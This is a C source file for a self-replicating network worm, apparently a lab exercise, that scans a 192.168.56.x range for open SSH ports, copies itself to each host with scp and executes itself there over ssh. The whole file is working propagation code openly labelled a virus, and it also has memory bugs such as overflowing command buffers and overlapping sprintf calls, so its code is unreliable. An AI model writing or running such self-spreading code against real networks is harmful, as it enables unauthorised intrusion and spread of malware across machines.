//gcc worm.c -o WORM

// This program scans the network, returns a list of IP adresses where the port 22 is opened
// It connects on ssh on these IP adresses and executes itself for sharing on all network


#include <stdio.h>
#include <sys/socket.h>
#include <errno.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#define PORT 22
#define USER "nico"

//Return a list of IP addresses where port 22 is opened
char** scanport(void){

	struct hostent *host;
	int err, i ,sock;
	int a=0;
	struct sockaddr_in sa;
	char hostname[] = "192.168.56.";

	char **addrIPList= malloc(sizeof(*hostname) * 255);

	//Initialize the sockaddr_in structure
	strncpy((char*)&sa , "" , sizeof sa);
	sa.sin_family = AF_INET;

	for(i=102;i<=105;i++){

		sprintf((hostname),"%s%d",hostname,i);

		printf("%s",hostname);
		if(isdigit(hostname[0]))
		{
			sa.sin_addr.s_addr = inet_addr(hostname);
			printf("\tDone\n");
		}

		//Resolve hostname to ip address
		else if( (host = gethostbyname(hostname)) != 0)
		{
			printf("Doing gethostbyname...");
			strncpy((char*)&sa.sin_addr , (char*)host->h_addr , sizeof sa.sin_addr);
			printf("Done\n");
		}
		else
		{
			herror(hostname);
			exit(2);
		}

		//Fill in the port number
		sa.sin_port = htons(PORT);

		//Create a socket of type internet
		sock = socket(AF_INET , SOCK_STREAM , 0);

		//Check whether socket created fine or not
		if(sock < 0)
		{
			perror("\nSocket");
			exit(1);
		}

		//Connect using that socket and sockaddr structure
		err = connect(sock , (struct sockaddr*)&sa , sizeof sa);

		//not connected
		if( err < 0 )
		{
			fflush(stdout);
		}

		//Connected
		else
		{
			printf("%-5d open\n",  PORT);
			addrIPList[a]= malloc(sizeof(char) * 20);
			strcpy(addrIPList[a],hostname);
			a++;
		}

		sprintf((hostname),"%s","192.168.56.");
	}
	close(sock);


	printf("\r");
	fflush(stdout);

	return addrIPList;


}

//Copy and share virus
void colonize(char* adresseIP, char* user){
	char* cmd=malloc(sizeof(char) * 20);

	//Copy virus
	sprintf(cmd, "scp WORM %s@%s:/home/%s/Bureau/test", user, adresseIP, user);
	printf("Copy virus : \n%s\n", cmd);
	system(cmd);

	//Execute virus
	sprintf(cmd, "./WORM");
	sprintf(cmd, "ssh %s@%s /home/%s/Bureau/test/WORM", user, adresseIP, user);
	printf("Execution virus : %s\n", cmd);
	system(cmd);
}

void wormDelete(char* adresseIP, char* user){
	char* cmd=malloc(sizeof(char) * 20);

	sprintf(cmd, " ssh %s@%s ; rm /home/%s/Bureau/test/WORM ", user, adresseIP, user);
	printf("Delete virus : %s\n", cmd);
	system(cmd);

}


int main(int argc , char **argv)
{
	char ** addrIPList;
	addrIPList=scanport();

	FILE *in;
	extern FILE *popen();
	char buff[50];
	int i, j;

	printf("\n\n");

	for(j=0;j<2;j++){
		colonize(addrIPList[j], USER);
		//wormDelete(addrIPList[j], USER);

	}

	free(addrIPList);


	return(0);
}
